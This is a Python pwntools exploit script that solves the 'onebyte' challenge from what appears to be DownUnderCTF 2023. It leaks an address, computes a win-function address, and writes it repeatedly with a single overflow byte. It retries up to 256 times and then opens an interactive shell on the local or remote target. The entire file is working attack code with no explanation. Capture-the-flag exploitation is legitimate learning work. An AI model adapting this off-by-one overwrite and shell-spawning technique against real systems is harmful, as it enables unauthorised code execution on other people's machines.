#!/usr/bin/env python3
from pwn import *

BINARY_PATH = './onebyte'
REMOTE_HOST = '2023.ductf.dev'
REMOTE_PORT = 30018

exe = context.binary = ELF(BINARY_PATH)
#  context.log_level = "DEBUG"

#  if args.REMOTE:
    #  libc = ELF("./libc.so.6")
#  else:
    #  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(REMOTE_HOST, REMOTE_PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break *(main+101)
continue
'''.format(**locals())

def exploit(io):

    io.recvuntil(b"junk: ")
    init_leak = int(io.recvuntil(b"\n")[:-1], 16)
    win_addr = init_leak+70
    log.success(f"init leak: {hex(init_leak)}")
    log.success(f"win addr: {hex(win_addr)}")
    io.clean()

    # we send address 4 times to give a better shot at landing at the right place
    io.send(pack(win_addr)*4+b"\xcc") # when data lands on based on c0

    io.sendline(b"id")
    io.recvuntil(b"uid")
    io.interactive()


def do_exploit():
    for _ in range(256):
        io = start()
        try:
            exploit(io)
            break
        except:
            print("failed..")
            pass
        finally:
            io.close()


if __name__ == "__main__":
    do_exploit()
